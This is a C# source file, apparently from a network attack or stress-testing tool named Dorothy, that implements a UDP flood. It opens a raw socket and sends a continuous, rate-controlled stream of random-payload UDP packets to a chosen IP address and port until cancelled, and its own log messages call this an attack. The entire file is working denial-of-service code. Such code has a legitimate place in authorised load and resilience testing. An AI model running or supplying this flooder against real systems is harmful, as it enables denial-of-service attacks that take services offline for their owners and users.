using System;
using System.Linq;
using System.Net;
using System.Net.NetworkInformation;
using System.Runtime.InteropServices;
using System.Threading;
using System.Threading.Tasks;
using System.Net.Sockets;
using System.Diagnostics;
using NLog;
using PacketDotNet;
using SharpPcap;
using SharpPcap.LibPcap;
using Dorothy.Models;

namespace Dorothy.Models
{
    public class UdpFlood : IDisposable
    {
        private static readonly ILogger Logger = LogManager.GetCurrentClassLogger();
        private readonly PacketParameters _params;
        private readonly CancellationToken _cancellationToken;
        private Socket? _socket;
        public event EventHandler<PacketEventArgs>? PacketSent;

        public UdpFlood(PacketParameters parameters, CancellationToken cancellationToken)
        {
            _params = parameters;
            _cancellationToken = cancellationToken;
        }

        protected virtual void OnPacketSent(byte[] packet, IPAddress sourceIp, IPAddress destinationIp, int port)
        {
            PacketSent?.Invoke(this, new PacketEventArgs(packet, sourceIp, destinationIp, port));
        }

        public async Task StartAsync()
        {
            Logger.Info("Starting UDP Flood attack.");

            try
            {
                _socket = new Socket(AddressFamily.InterNetwork, SocketType.Raw, System.Net.Sockets.ProtocolType.Udp);
                _socket.SetSocketOption(SocketOptionLevel.IP, SocketOptionName.HeaderIncluded, false);

                byte[] udpHeader = new byte[8];  // UDP header size
                byte[] payload = new byte[1400]; // Payload size

                var random = new Random();
                // Account for full Ethernet frame: Ethernet header (14) + IP header (20) + UDP header (8) + payload (1400) + FCS (4)
                // Raw sockets send at Layer 3, OS adds Ethernet frame
                int totalPacketSize = 14 + 20 + udpHeader.Length + payload.Length + 4; // Ethernet (14) + IP (20) + UDP (8) + payload (1400) + FCS (4) = 1446 bytes
                double packetsPerSecond = (double)_params.BytesPerSecond / totalPacketSize;
                double microsecondsPerPacket = 1_000_000.0 / packetsPerSecond;
                long ticksPerPacket = (long)(microsecondsPerPacket * Stopwatch.Frequency / 1_000_000.0);

                await Task.Run(() =>
                {
                    var stopwatch = Stopwatch.StartNew();
                    var endpoint = new IPEndPoint(_params.DestinationIp, 0);
                    byte[] fullPacket = new byte[udpHeader.Length + payload.Length];
                    long nextPacketTime = 0; // Track when next packet should be sent

                    while (!_cancellationToken.IsCancellationRequested)
                    {
                        try
                        {
                            long currentTicks = stopwatch.ElapsedTicks;
                            
                            // Wait until it's time to send the next packet
                            if (currentTicks < nextPacketTime)
                            {
                                long waitTicks = nextPacketTime - currentTicks;
                                long waitMicroseconds = (waitTicks * 1_000_000L) / Stopwatch.Frequency;
                                
                                if (waitMicroseconds > 1000)
                                {
                                    Thread.Sleep((int)(waitMicroseconds / 1000));
                                }
                                
                                // Fine-grained spin wait
                                while (stopwatch.ElapsedTicks < nextPacketTime)
                                {
                                    Thread.SpinWait(10);
                                }
                            }

                            // Create UDP header
                            BitConverter.GetBytes((ushort)_params.SourcePort).CopyTo(udpHeader, 0);
                            BitConverter.GetBytes((ushort)_params.DestinationPort).CopyTo(udpHeader, 2);
                            BitConverter.GetBytes((ushort)(8 + payload.Length)).CopyTo(udpHeader, 4); // Length
                            BitConverter.GetBytes((ushort)0).CopyTo(udpHeader, 6); // Checksum

                            // Generate random payload
                            random.NextBytes(payload);

                            // Combine header and payload
                            Buffer.BlockCopy(udpHeader, 0, fullPacket, 0, udpHeader.Length);
                            Buffer.BlockCopy(payload, 0, fullPacket, udpHeader.Length, payload.Length);

                            _socket.SendTo(fullPacket, endpoint);
                            OnPacketSent(fullPacket, _params.SourceIp, _params.DestinationIp, _params.DestinationPort);

                            // Schedule next packet
                            nextPacketTime = stopwatch.ElapsedTicks + ticksPerPacket;
                        }
                        catch (Exception ex)
                        {
                            Logger.Error(ex, "Failed sending UDP packet (Layer 3).");
                        }
                    }
                }, _cancellationToken);
            }
            catch (Exception ex)
            {
                Logger.Error(ex, "UDP Flood attack failed.");
                throw;
            }
        }

        public void Dispose()
        {
            _socket?.Dispose();
        }
    }
} 